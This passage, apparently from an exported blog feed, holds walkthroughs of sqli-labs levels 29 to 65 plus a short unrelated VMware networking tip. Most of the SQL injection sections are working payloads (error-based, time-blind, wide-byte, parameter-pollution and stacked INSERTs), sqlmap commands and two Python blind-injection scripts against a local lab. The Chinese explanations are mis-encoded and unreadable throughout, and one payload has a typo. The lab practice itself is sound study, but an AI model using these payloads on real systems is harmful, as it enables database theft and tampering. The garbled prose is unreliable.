<p><code>?id=0 and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="60"><a href="#60" class="headerlink" title="60"></a>60</h3><p>ç”¨<code>&quot;)</code>é—­åˆ å’Œ58ä¸€æ ·</p>
<br>

<h3 id="61"><a href="#61" class="headerlink" title="61"></a>61</h3><p>ç”¨<code>&#39;))</code>é—­åˆ</p>
<p><code>?id=0&#39;)) and updatexml(1,concat(0xs7e,database(),0x7e),1)--+</code></p>
<br>

<h3 id="62"><a href="#62" class="headerlink" title="62"></a>62</h3><p>ç”¨<code>&#39;)</code>é—­åˆ è¿™å…³æ²¡å›æ˜¾ ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<p>æ ¹æ®å‰é¢å‡ å…³å¯ä»¥å¾—åˆ°</p>
<p>æ•°æ®åº“ä¸º challenges</p>
<p>table æ˜¯éšæœº10ä¸ºå­—ç¬¦ç»„æˆ</p>
<p>columnæ˜¯secret_ å’Œå››ä½éšæœºå­—ç¬¦ç»„æˆ </p>
<p>æœ¬å…³é™åˆ¶é‡ç½®æ¬¡æ•°ä¸º130æ¬¡ï¼Œå¯ä»¥å†™ä¸ªpythonè„šæœ¬è¯•ä¸€ä¸‹</p>
<br>

<br>

<p><code>?id=1&#39;) and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<p><code>?id=1&#39;) and ascii(substr((select group_concat(column_name) from information_schema.tables where table_schema=database() and table_name=&#39;8mdr4weo2b&#39;),&#123;i&#125;,1))&gt;&#123;m&#125;--+</code></p>
<br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æŸ¥è¡¨å</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">11</span>):  <span class="comment">#å·²çŸ¥è¡¨é•¿ä¸º10</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high-low&gt;<span class="number">1</span>:</span><br><span class="line">        mid = (high + low)//<span class="number">2</span></span><br><span class="line">        m = payloads[mid]           <span class="comment">#äºŒåˆ†æ³•åˆ¤æ–­</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select group_concat(table_name) from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.tables where table_schema=database()),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:   <span class="comment">#Angelinaæ˜¯æ­£å¸¸é¡µé¢ä¸‹çš„ç»“æœ</span></span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æŸ¥å­—æ®µ</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/sqli-labs/Less-62/&#x27;</span></span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payloads = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">48</span>,<span class="number">58</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">65</span>,<span class="number">91</span>))+<span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">97</span>,<span class="number">123</span>))   </span><br><span class="line"></span><br><span class="line"><span class="comment"># å­—æ®µä¸ºsecret_XXXX</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">61</span></span><br><span class="line">    <span class="keyword">while</span> high - low &gt; <span class="number">1</span>:</span><br><span class="line">        mid = (high + low) // <span class="number">2</span></span><br><span class="line">        m = payloads[mid]  <span class="comment"># äºŒåˆ†æ³•åˆ¤æ–­</span></span><br><span class="line">        payload = <span class="string">f&quot;?id=1&#x27;) and ascii(substr((select column_name from &quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns where table_name=&#x27;eu3ls8m6rg&#x27; limit 2,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;m&#125;</span>--+&quot;</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Angelina&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    data += <span class="built_in">chr</span>(payloads[high])</span><br><span class="line">    print(<span class="string">&#x27;secret_&#x27;</span>+data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="63"><a href="#63" class="headerlink" title="63"></a>63</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•åŒ62</p>
<br>

<h3 id="64"><a href="#64" class="headerlink" title="64"></a>64</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=((<span class="subst">$id</span>)) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•åŒ62</p>
<br>

<h3 id="65"><a href="#65" class="headerlink" title="65"></a>65</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM security.users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ–¹æ³•åŒ62</p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>Linuxè™šæ‹Ÿæœºåœ¨NATæ¨¡å¼ä¸‹ä¸»æœºpingä¸é€šè™šæ‹Ÿæœº</title>
    <url>/posts/ccb4aa11/</url>
    <content><![CDATA[<p>åŸå› :æœ¬æœºçš„VMware Network Adapter VMnet8çš„å’Œè™šæ‹Ÿæœºè®¾ç½®çš„ç½‘æ®µä¸ä¸€æ ·</p>
<p>è®¾ç½®ç½‘ç»œé€‚é…å™¨ä¸è™šæ‹Ÿæœºçš„ç½‘æ®µä¸€è‡´ï¼Œä¹‹åä¾¿å¯ä»¥pingé€š</p>
<p>å¦‚æœç½‘æ®µä¸€è‡´ï¼Œå°±é‡æ–°å¯åŠ¨ä¸‹ç½‘å¡ï¼ˆç¦ç”¨åå†å¯åŠ¨å³å¯ï¼‰</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs4</title>
    <url>/posts/8ad9e0b5/</url>
    <content><![CDATA[<h3 id="42-å †å æ³¨å…¥"><a href="#42-å †å æ³¨å…¥" class="headerlink" title="42 å †å æ³¨å…¥"></a>42 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line">   </span><br><span class="line">... ... </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>åªå¯¹usernameåšäº†å¤„ç†ï¼Œå¯¹passwordæ²¡æœ‰å¤„ç†</p>
<p><code>login_user=admin&amp;login_password=1%27%3Bcreate+table+test44 like users%23&amp;mysubmit=Login</code></p>
<br>

<h3 id="43-å †å æ³¨å…¥"><a href="#43-å †å æ³¨å…¥" class="headerlink" title="43 å †å æ³¨å…¥"></a>43 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$con1</span> = mysqli_connect(<span class="variable">$host</span>,<span class="variable">$dbuser</span>,<span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="variable">$username</span> = mysqli_real_escape_string(<span class="variable">$con1</span>, <span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>];</span><br><span class="line"></span><br><span class="line">... ...</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=(&#x27;<span class="subst">$username</span>&#x27;) and password=(&#x27;<span class="subst">$password</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šä¸€å…³å·®ä¸å¤šï¼Œä½¿ç”¨<code>&#39;)</code>é—­åˆ</p>
<br>

<h3 id="44-å †å æ³¨å…¥"><a href="#44-å †å æ³¨å…¥" class="headerlink" title="44 å †å æ³¨å…¥"></a>44 å †å æ³¨å…¥</h3><p>å’Œ42ä¸€æ ·</p>
<br>

<h3 id="45-å †å æ³¨å…¥"><a href="#45-å †å æ³¨å…¥" class="headerlink" title="45 å †å æ³¨å…¥"></a>45 å †å æ³¨å…¥</h3><p>å’Œ43ä¸€æ ·</p>
<br>

<h3 id="46-order-byæ³¨å…¥"><a href="#46-order-byæ³¨å…¥" class="headerlink" title="46 order byæ³¨å…¥"></a>46 <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>?sort=1%20desc</code>æˆ–è€…<code>?sort=1%20asc</code> æ•°æ®ä¸åŒï¼Œå¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<p><code>?sort=1 updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>ä¹Ÿå¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<p><code>?sort=1 and if(1=1,sleep(1),0)</code>ä¼šå“åº”ä¸€æ®µæ—¶é—´</p>
<p><code>?sort=1 and if(1=1,0,sleep(1))</code> ä¼šå³å¯å¾—åˆ°ä¿¡æ¯</p>
<br>

<br>

<h3 id="47-order-byæ³¨å…¥"><a href="#47-order-byæ³¨å…¥" class="headerlink" title="47  order byæ³¨å…¥"></a>47  <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?sort=1&#39; desc --+</code>   <code>?sort=1&#39; asc --+</code></p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<br>

<h3 id="48-order-byæ³¨å…¥"><a href="#48-order-byæ³¨å…¥" class="headerlink" title="48 order byæ³¨å…¥"></a>48 <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥å‚è€ƒ46</p>
<p>è¿™å…³æ²¡å›æ˜¾ï¼Œè€ƒè™‘ä½¿ç”¨æ—¶é—´ç›²æ³¨</p>
<br>

<p>SQlmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-48/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="49-order-byæ³¨å…¥"><a href="#49-order-byæ³¨å…¥" class="headerlink" title="49 order byæ³¨å…¥"></a>49 <code>order by</code>æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>?sort=1%27%20%20and%20sleep(1)--+</code>æ—¶é—´ç›²æ³¨</p>
<br>

<p>SQLmap</p>
<p><code>python sqlmap.py -u 192.168.56.1/sqli-labs/Less-49/?sort=1  --technique T --batch --dbs</code></p>
<br>

<h3 id="50-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#50-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="50 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>50 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">	<span class="comment">/* execute multi query */</span></span><br><span class="line">	<span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">	... ...</span><br></pre></td></tr></table></figure>

<p>order byæ³¨å…¥å’Œå †å æ³¨å…¥</p>
<p>æ•°å­—å‹ å¯ä»¥ä½¿ç”¨æ—¶é—´ç›²æ³¨å’ŒæŠ¥é”™æ³¨å…¥</p>
<p><code>?sort=1%20and%20sleep(1)</code></p>
<p><code>?sort=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</code></p>
<br>

<p>å †å æ³¨å…¥</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;50&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="51-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#51-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="51 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>51 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)) </span><br></pre></td></tr></table></figure>

<p>æŠ¥é”™æ³¨å…¥</p>
<p><code>?sort=1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1)--+</code></p>
<br>

<p>å †å æ³¨å…¥</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;51&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="52-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#52-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="52 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>52 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br></pre></td></tr></table></figure>

<br>

<p>å †å æ³¨å…¥</p>
<p><code>?sort=1;insert into users(id,username,password) values(&#39;52&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<br>

<h3 id="53-order-byæ³¨å…¥-amp-å †å æ³¨å…¥"><a href="#53-order-byæ³¨å…¥-amp-å †å æ³¨å…¥" class="headerlink" title="53 order byæ³¨å…¥&amp;å †å æ³¨å…¥"></a>53 <code>order by</code>æ³¨å…¥&amp;å †å æ³¨å…¥</h3><p>å †å æ³¨å…¥</p>
<p><code>?sort=1&#39;;insert into users(id,username,password) values(&#39;53&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs3</title>
    <url>/posts/14bd7516/</url>
    <content><![CDATA[<h3 id="29-å‚æ•°æ±¡æŸ“"><a href="#29-å‚æ•°æ±¡æŸ“" class="headerlink" title="29 å‚æ•°æ±¡æŸ“"></a>29 å‚æ•°æ±¡æŸ“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  ... ... </span><br><span class="line">  </span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">whitelist</span>(<span class="params"><span class="variable">$input</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$match</span> = preg_match(<span class="string">&quot;/^\d+$/&quot;</span>, <span class="variable">$input</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$match</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//echo &quot;you are good&quot;;</span></span><br><span class="line">		<span class="comment">//return $match;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;	</span><br><span class="line">		header(<span class="string">&#x27;Location: hacked.php&#x27;</span>);</span><br><span class="line">		<span class="comment">//echo &quot;you are bad&quot;;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">java_implimentation</span>(<span class="params"><span class="variable">$query_string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$q_s</span> = <span class="variable">$query_string</span>;</span><br><span class="line">	<span class="variable">$qs_array</span>= explode(<span class="string">&quot;&amp;&quot;</span>,<span class="variable">$q_s</span>);   <span class="comment">//ç”¨`&amp;`åˆ†å‰²å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$qs_array</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$val</span>=substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">2</span>);     <span class="comment">//æˆªå–å‰ä¸¤ä½å­—ç¬¦</span></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$val</span>==<span class="string">&quot;id&quot;</span>)              </span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$id_value</span>=substr(<span class="variable">$value</span>,<span class="number">3</span>,<span class="number">30</span>); </span><br><span class="line">			<span class="keyword">return</span> <span class="variable">$id_value</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;                  </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ç”¨&amp;åˆ†å‰²å­—ç¬¦ä¸²ä¸ºä¸¤éƒ¨åˆ†ï¼Œç„¶åè¿›è¡Œæ•°ç»„éå†ï¼Œå¦‚æœå­—ç¬¦å‰ä¸¤ä½ä¸ºidï¼Œé‚£ä¹ˆè¿”å›å®ƒçš„3-30ä½å­—ç¬¦</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">explode(separator,string,limit) å‡½æ•°æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚</span><br><span class="line">separator å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚</span><br><span class="line">string å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">limit å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚å¯èƒ½çš„å€¼ï¼š</span><br><span class="line">    å¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š limit ä¸ªå…ƒç´ çš„æ•°ç»„</span><br><span class="line">    å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -limit ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„</span><br><span class="line">    0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br>

<p>å¯¹äº<code>login.php?id=1&amp;id=2</code> apache(php)ä¼šè§£ææœ€åä¸€ä¸ªå‚æ•°ï¼Œtomcat(jsp)ä¼šè§£æç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ª<code>id</code>ä¼šç»è¿‡<code>whitelist()</code>å’Œ<code>java_implimentation()</code></p>
<p><code>whitelist()</code>ä½œç”¨æ˜¯ä¼ å…¥çš„å‚æ•°å¿…é¡»æ˜¯ä¸€ä½åŠä»¥ä¸Šçš„æ•°å­—</p>
<p><code>java_implimentation()</code>ç”¨<code>&amp;</code>åˆ†å‰²å­—ç¬¦ä¸²ä¸ºä¸¤éƒ¨åˆ†ï¼Œç„¶åè¿›è¡Œæ•°ç»„éå†ï¼Œå¦‚æœå­—ç¬¦å‰ä¸¤ä½ä¸ºidï¼Œé‚£ä¹ˆè¿”å›å®ƒçš„3-30ä½å­—ç¬¦</p>
<p>å‚æ•°æ±¡æŸ“ <code>id=1 &amp; id=0&#39; union select 1,2,&#39;3</code></p>
<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>å¯ä»¥å‚è€ƒ<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
<h3 id="30-å‚æ•°æ±¡æŸ“"><a href="#30-å‚æ•°æ±¡æŸ“" class="headerlink" title="30 å‚æ•°æ±¡æŸ“"></a>30 å‚æ•°æ±¡æŸ“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>å’Œä¸Šä¸€å…³å·®ä¸å¤š åŒå¼•å·é—­åˆ</p>
<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
<h3 id="31-å‚æ•°æ±¡æŸ“"><a href="#31-å‚æ•°æ±¡æŸ“" class="headerlink" title="31 å‚æ•°æ±¡æŸ“"></a>31 å‚æ•°æ±¡æŸ“</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
<br>

<h3 id="32-å®½å­—èŠ‚æ³¨å…¥"><a href="#32-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="32 å®½å­—èŠ‚æ³¨å…¥"></a>32 å®½å­—èŠ‚æ³¨å…¥</h3><br>

<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
<p>åœ¨æŸ¥å­—æ®µåçš„æ—¶å€™éœ€è¦æŠŠ<code>&#39;users&#39;</code>è½¬æˆ16è¿›åˆ¶ï¼Œ16è¿›åˆ¶çš„è¡¨åä¸éœ€è¦å¼•å· <code>0x7573657273</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
<br>

<h3 id="33-å®½å­—èŠ‚æ³¨å…¥"><a href="#33-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="33 å®½å­—èŠ‚æ³¨å…¥"></a>33 å®½å­—èŠ‚æ³¨å…¥</h3><p>å’Œ32ä¸€æ¨¡ä¸€æ ·</p>
<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
<br>

<h3 id="34-å®½å­—èŠ‚æ³¨å…¥-POST"><a href="#34-å®½å­—èŠ‚æ³¨å…¥-POST" class="headerlink" title="34 å®½å­—èŠ‚æ³¨å…¥(POST)"></a>34 å®½å­—èŠ‚æ³¨å…¥(POST)</h3><p>è¿‡æ»¤æ–¹å¼å’Œä¸Šé¢çš„ä¸€æ ·ï¼Œå¯ä»¥ä½¿ç”¨burpç›´æ¥ä¼ ï¼Œä¸è¿‡POSTä¼ å…¥æ•°æ®æ—¶ä¼šè¿›è¡Œurlç¼–ç ï¼Œ</p>
<p>åœ¨è¾“å…¥ <code>1%df or 1=1#</code>åæŠ“åŒ…å¯ä»¥çœ‹åˆ°å‰é¢çš„<code>%df</code>å˜æˆäº†<code>%25df</code></p>
<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>ä¿®æ”¹ä¸€ä¸‹å³å¯</p>
<br>

<br>

<h3 id="35-å®½å­—èŠ‚æ³¨å…¥"><a href="#35-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="35 å®½å­—èŠ‚æ³¨å…¥"></a>35 å®½å­—èŠ‚æ³¨å…¥</h3><p>å’Œ32å·®ä¸å¤š åªä¸è¿‡è¿™é‡Œæ˜¯å­—ç¬¦å‹ï¼Œä¸éœ€è¦<code>&#39;</code>é—­åˆ</p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<br>

<h3 id="36-å®½å­—èŠ‚æ³¨å…¥"><a href="#36-å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="36 å®½å­—èŠ‚æ³¨å…¥"></a>36 å®½å­—èŠ‚æ³¨å…¥</h3><p>å’Œå‰é¢ä¸€æ ·</p>
<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)â€“+</p>
<br>

<h3 id="37-å®½å­—èŠ‚æ³¨å…¥-POST"><a href="#37-å®½å­—èŠ‚æ³¨å…¥-POST" class="headerlink" title="37 å®½å­—èŠ‚æ³¨å…¥(POST)"></a>37 å®½å­—èŠ‚æ³¨å…¥(POST)</h3><p>å’Œ34ä¸€æ ·</p>
<br>

<h3 id="38-å †å æ³¨å…¥"><a href="#38-å †å æ³¨å…¥" class="headerlink" title="38 å †å æ³¨å…¥"></a>38 å †å æ³¨å…¥</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = 